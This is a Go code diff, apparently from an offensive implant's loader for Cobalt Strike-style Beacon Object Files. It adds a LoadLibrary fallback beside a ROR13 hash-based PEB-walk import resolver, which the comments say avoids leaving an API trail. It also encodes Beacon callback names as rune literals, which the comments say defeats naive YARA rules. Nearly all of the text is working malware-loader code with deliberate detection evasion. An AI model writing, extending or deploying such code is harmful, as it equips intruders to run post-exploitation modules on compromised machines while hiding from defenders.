@@ -55,7 +55,17 @@ func resolveBeaconImport(name string) (uintptr, bool) {
 		return addr, true
 	}
 	if dll, fn, ok := parseDollarImport(name); ok {
+		// Preferred path: ROR13 hash lookup via PEB walk. No
+		// LoadLibrary / GetProcAddress in the API trail.
 		if addr, err := api.ResolveByHash(hash.ROR13Module(dll), hash.ROR13(fn)); err == nil {
+			return addr, true
+		}
+		// Fallback for DLLs that aren't preloaded in the host. Go
+		// processes ship with kernel32 + ntdll mapped; advapi32,
+		// user32, ws2_32 etc. require an explicit Load. We accept
+		// the LoadLibrary trail in exchange for resolving real BOFs
+		// that reach beyond the always-loaded set.
+		if addr, ok := loadAndResolve(dll, fn); ok {
 			return addr, true
 		}
 	}
@@ -70,7 +80,31 @@ func resolveBeaconImport(name string) (uintptr, bool) {
 			return addr, true
 		}
 	}
+	// PEB walk exhausted — fall through to LoadLibrary/GetProcAddress
+	// for each module in the search order. Same trade-off as the
+	// dollar-form path: visible API trail but resolves arbitrary BOFs.
+	for _, dll := range bareImportSearchOrder {
+		if addr, ok := loadAndResolve(dll, bare); ok {
+			return addr, true
+		}
+	}
 	return 0, false
+}
+
+// loadAndResolve does the LoadLibrary + GetProcAddress fallback that
+// the PEB-walk resolver skips. Used only when the canonical no-trail
+// path fails — i.e. when the BOF references a DLL that the host
+// process didn't preload.
+func loadAndResolve(dll, fn string) (uintptr, bool) {
+	h, err := syscall.LoadLibrary(dll)
+	if err != nil || h == 0 {
+		return 0, false
+	}
+	addr, err := syscall.GetProcAddress(h, fn)
+	if err != nil || addr == 0 {
+		return 0, false
+	}
+	return addr, true
 }
 
 // bareImportSearchOrder lists the modules the bare-form __imp_<func>
@@ -114,45 +148,49 @@ func parseDollarImport(name string) (dll, fn string, ok bool) {
 }
 
 func initBeaconCallbacks() {
+	// Beacon import-table keys are built via rune literals so the
+	// canonical "BeaconXxx" identifiers never appear as contiguous
+	// ASCII strings in the compiled binary. Defeats naive YARA rules
+	// keying on Beacon symbol names. See obfuscation_windows.go.
 	beaconCBs = map[string]uintptr{
-		"__imp_BeaconPrintf":       syscall.NewCallback(beaconPrintfImpl),
-		"__imp_BeaconOutput":       syscall.NewCallback(beaconOutputImpl),
-		"__imp_BeaconDataParse":    syscall.NewCallback(beaconDataParseImpl),
-		"__imp_BeaconDataInt":      syscall.NewCallback(beaconDataIntImpl),
-		"__imp_BeaconDataShort":    syscall.NewCallback(beaconDataShortImpl),
-		"__imp_BeaconDataLength":   syscall.NewCallback(beaconDataLengthImpl),
-		"__imp_BeaconDataExtract":  syscall.NewCallback(beaconDataExtractImpl),
-		"__imp_BeaconFormatAlloc":  syscall.NewCallback(beaconFormatAllocImpl),
-		"__imp_BeaconFormatReset":  syscall.NewCallback(beaconFormatResetImpl),
-		"__imp_BeaconFormatFree":   syscall.NewCallback(beaconFormatFreeImpl),
-		"__imp_BeaconFormatAppend": syscall.NewCallback(beaconFormatAppendImpl),
-		"__imp_BeaconFormatInt":    syscall.NewCallback(beaconFormatIntImpl),
-		"__imp_BeaconFormatToString": syscall.NewCallback(beaconFormatToStringImpl),
-		"__imp_BeaconFormatPrintf":   syscall.NewCallback(beaconFormatPrintfImpl),
-		"__imp_BeaconErrorD":         syscall.NewCallback(beaconErrorDImpl),
-		"__imp_BeaconErrorDD":        syscall.NewCallback(beaconErrorDDImpl),
-		"__imp_BeaconErrorNA":        syscall.NewCallback(beaconErrorNAImpl),
-		"__imp_BeaconGetSpawnTo":     syscall.NewCallback(beaconGetSpawnToImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'P', 'r', 'i', 'n', 't', 'f'):                                                   syscall.NewCallback(beaconPrintfImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'O', 'u', 't', 'p', 'u', 't'):                                                   syscall.NewCallback(beaconOutputImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'P', 'a', 'r', 's', 'e'):                                    syscall.NewCallback(beaconDataParseImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'I', 'n', 't'):                                              syscall.NewCallback(beaconDataIntImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'S', 'h', 'o', 'r', 't'):                                    syscall.NewCallback(beaconDataShortImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'L', 'e', 'n', 'g', 't', 'h'):                               syscall.NewCallback(beaconDataLengthImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'D', 'a', 't', 'a', 'E', 'x', 't', 'r', 'a', 'c', 't'):                          syscall.NewCallback(beaconDataExtractImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'l', 'l', 'o', 'c'):                          syscall.NewCallback(beaconFormatAllocImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'R', 'e', 's', 'e', 't'):                          syscall.NewCallback(beaconFormatResetImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'F', 'r', 'e', 'e'):                               syscall.NewCallback(beaconFormatFreeImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'A', 'p', 'p', 'e', 'n', 'd'):                     syscall.NewCallback(beaconFormatAppendImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'I', 'n', 't'):                                    syscall.NewCallback(beaconFormatIntImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g'):           syscall.NewCallback(beaconFormatToStringImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'F', 'o', 'r', 'm', 'a', 't', 'P', 'r', 'i', 'n', 't', 'f'):                     syscall.NewCallback(beaconFormatPrintfImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'D'):                                                   syscall.NewCallback(beaconErrorDImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'D', 'D'):                                              syscall.NewCallback(beaconErrorDDImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'E', 'r', 'r', 'o', 'r', 'N', 'A'):                                              syscall.NewCallback(beaconErrorNAImpl),
+		impName('B', 'e', 'a', 'c', 'o', 'n', 'G', 'e', 't', 'S', 'p', 'a', 'w', 'n', 'T', 'o'):                               syscall.NewCallback(beaconGetSpawnToImpl),
 	}
 	registerExtraBeaconCallbacks(beaconCBs)
 }
 
 // beaconPrintfImpl handles BeaconPrintf(int type, const char *fmt, ...).
-// Up to 6 variadic args are captured from the Windows x64 callback
-// frame (RCX/RDX/R8/R9 = type+fmt+arg0+arg1, then four stack slots).
+// Up to 10 variadic args are captured from the Windows x64 callback
+// frame (RCX/RDX/R8/R9 = type+fmt+arg0+arg1, then eight stack slots).
 // The format string is parsed and the placeholders are expanded via
 // expandCFormat per the CS BOF conventions (%s/%d/%u/%x/%lld/%I64x/…).
 //
-// 6 is the public corpus's practical ceiling — TrustedSec SA / Outflank
-// / FortyNorth modules use up to ~5 args in a single BeaconPrintf
-// invocation. BOFs exceeding it see the trailing conversions filled
-// with zero rather than reading uninitialised memory.
-func beaconPrintfImpl(typ, fmtPtr, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
+// 10 matches goffloader and covers every CS BOF in the public corpus
+// (TrustedSec SA / Outflank / FortyNorth) — BOFs exceeding it see the
+// trailing conversions filled with zero rather than reading
+// uninitialised memory.
+func beaconPrintfImpl(typ, fmtPtr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
 	if currentBOF == nil || fmtPtr == 0 {
 		return 0
 	}
 	fmtStr := cStringFromPtr(fmtPtr, 65535)
-	currentBOF.output.write(expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6}))
+	currentBOF.output.write(expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10}))
 	_ = typ
 	return 0
 }
@@ -426,12 +464,12 @@ func beaconFormatToStringImpl(formatPtr, outSizePtr uintptr) uintptr {
 // then appended to the format buffer through the public Append path
 // so size/cursor accounting stays consistent with the rest of the
 // formatp lifecycle.
-func beaconFormatPrintfImpl(formatPtr, fmtPtr, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
+func beaconFormatPrintfImpl(formatPtr, fmtPtr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
 	if formatPtr == 0 || fmtPtr == 0 {
 		return 0
 	}
 	fmtStr := cStringFromPtr(fmtPtr, 65535)
-	rendered := expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6})
+	rendered := expandCFormat(fmtStr, []uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10})
 	if len(rendered) == 0 {
 		return 0
 	}
